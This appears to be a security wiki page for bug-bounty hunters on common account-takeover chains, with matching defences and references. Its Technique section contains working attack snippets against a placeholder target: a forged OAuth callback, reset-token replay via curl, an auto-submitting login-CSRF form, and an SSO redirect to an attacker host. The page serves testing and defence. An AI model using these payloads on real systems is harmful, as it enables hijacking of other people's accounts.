---
title: Account Takeover Patterns
slug: account-takeover-patterns
---

> **TL;DR:** Most ATO findings are not novel primitives but recurring chains: OAuth state misbinding, email-verification reuse, leaked reset secrets, login CSRF via session fixation, and SSO callback redirects.

## What it is
Account takeover is the prize outcome of many bounty reports, and the same five or six chains keep paying out across programs. Recognising the shape of each chain lets you triage flows quickly: identity binding, recovery, session establishment, and federated login each have a canonical failure mode worth probing on every target.

## Preconditions / where it applies
- OAuth/OIDC clients that omit or fail to verify the `state` parameter (pre-account hijack)
- Email-verification or magic-link tokens that are long-lived, single-tenant, or reusable
- Password-reset flows that put the secret in the URL, the referer, or analytics tags
- Login forms reachable cross-site with no CSRF token and no `SameSite` cookie attribute (session fixation)
- SSO callback endpoints accepting open `redirect_uri` or `RelayState` values

## Technique
Pre-account hijack via OAuth state misbinding:
```http
GET /oauth/callback?code=ATTACKER_CODE&state=VICTIM_STATE HTTP/1.1
Host: target.tld
Cookie: session=victim_pre_login_session
```

Reset-link reuse / referer leak:
```bash
# Trigger reset, capture the link, request it twice
curl -sX POST https://target.tld/reset -d 'email=victim@x'
curl -s 'https://target.tld/reset/confirm?token=AAA'  # used
curl -s 'https://target.tld/reset/confirm?token=AAA'  # still valid? -> finding
```

Login CSRF + session fixation:
```html
<form action="https://target.tld/login" method="POST">
  <input name="user" value="attacker">
  <input name="pass" value="hunter2">
</form>
<script>document.forms[0].submit()</script>
```

SSO callback redirect:
```
https://target.tld/sso/callback?RelayState=https://attacker.tld
```

## Detection and defence
- Bind OAuth `state` and PKCE `code_verifier` to the pre-login session and reject mismatches
- One-shot, short-lived (<15 min) reset tokens; rotate session ID on every privilege change
- Strip referer on reset pages (`Referrer-Policy: no-referrer`) and never embed secrets in analytics tags
- `SameSite=Lax` or `Strict` cookies plus CSRF tokens on login and SSO callbacks; allowlist `redirect_uri`

## References
- [OWASP ASVS v4.0 — Authentication](https://owasp.org/www-project-application-security-verification-standard/) — control checklist covering each ATO chain
- [PortSwigger — OAuth 2.0 authentication vulnerabilities](https://portswigger.net/web-security/oauth) — chained pre-account hijack labs

See also: [[oauth-flows]], [[sso-attacks]], [[account-recovery-attacks]].
